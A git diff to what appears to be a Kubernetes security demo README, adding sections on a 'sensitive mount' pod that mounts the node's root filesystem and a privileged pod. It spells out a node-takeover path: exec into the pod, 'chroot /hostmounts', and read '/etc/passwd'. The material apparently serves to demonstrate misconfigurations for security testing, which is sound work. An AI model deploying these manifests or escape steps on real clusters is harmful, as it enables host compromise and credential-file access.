@@ -433,7 +433,7 @@ Quick fix for everything:
 kubectl starboard uninstall
 kubectl starboard install
 ```
-    
+
 ## Autoscaling
 
 Note move this to userdata: kubectl apply -f https://k8s.io/examples/application/php-apache.yaml
@@ -460,3 +460,56 @@ Observe the changes in the autoscaling:
 Get more detailed information about the autoscaling by:
 
     kubectl describe hpa php-apache
+
+## Sensitive mount
+
+The following yaml file mounts the Node's root filesystem under /hostmounts. Save the file as `sensitive-mount.yaml` and run it using `kubectl apply -f sensitive-mount.yaml`:
+
+```
+apiVersion: v1
+kind: Pod
+metadata:
+  name: sensitive-mount
+  namespace: default
+spec:
+  containers:
+  - image: bash:5.1.16
+    name: sensitive-mount
+    command:
+      - /bin/sh
+      - "-c"
+      - "sleep 60m"
+    volumeMounts:
+    - mountPath: /hostmounts
+      name: hostvol
+  restartPolicy: Never
+  volumes:
+    - name: hostvol
+      hostPath:
+        path: /
+```
+
+When you open an interactive shell to the pod using `kubectl exec -it  --stdin sensitive-mount  -- bash` you can find the Node's filesystem under /hostmounts. You can take over the Node simply by switching to it's namespace by running `chroot /hostmounts`. You can verify this for example by running `cat /etc/passwd` and seeing the user `ec2-user` that is the default user of an AWS EC2 Linux instance.
+
+## Privileged pod
+
+Running a pod in a privileged mode means that the pod can access the host’s resources and kernel capabilities. The following YAML will set up a privileged pod:
+
+```
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privileged-pod
+  namespace: default
+spec:
+  containers:
+  - image: bash:5.1.16
+    name: privileged-pod
+    command:
+      - /bin/sh
+      - "-c"
+      - "sleep 60m"
+    securityContext:
+      privileged: true
+      runAsUser: 999
+```
